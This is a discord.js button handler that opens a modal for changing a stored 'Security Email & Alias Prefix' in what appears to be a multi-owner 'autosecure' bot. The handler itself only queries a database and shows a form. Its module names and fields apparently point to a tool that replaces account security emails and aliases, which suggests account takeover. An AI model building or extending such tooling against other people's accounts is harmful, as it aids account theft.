const { TextInputStyle } = require("discord.js");
const generate = require("../../utils/generate");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");
const { queryParams } = require("../../../db/database");
const config = require("../../../config.json");

module.exports = {
    name: "changeprefixautosecure",
    editautosecure: true,
    callback: async (client, interaction) => {
        try {
            const [t, botnumber, ownerid] = interaction.customId.split("|");
            const actionId = generate(32);

            await queryParams(
                `INSERT INTO actions (id, action) VALUES (?, ?)`,
                [actionId, `modalchangeprefix|${botnumber}|${ownerid}`]
            );

            const settings = await queryParams(
                `SELECT prefix FROM autosecure WHERE user_id = ? AND botnumber = ?`,
                [ownerid, botnumber]
            );

            const currentPrefix = settings[0]?.prefix || config.prefix || "HachiiroMC";

            return interaction.showModal(modalBuilder(
                `action|${actionId}`,
                `Change Email & Alias Prefix`,
                [
                    {
                        setCustomId: 'prefix',
                        setRequired: true,
                        setLabel: 'Security Email & Alias Prefix',
                        setPlaceholder: 'Ex: HachiiroMC, VinGroup, etc.',
                        setStyle: TextInputStyle.Short,
                        setValue: currentPrefix,
                        setMaxLength: 30,
                        setMinLength: 1
                    }
                ]
            ));
        } catch (error) {
            console.error("Error in changeprefixautosecure button:", error);
            return interaction.reply({
                content: "An error occurred while opening prefix modal.",
                ephemeral: true
            });
        }
    }
};
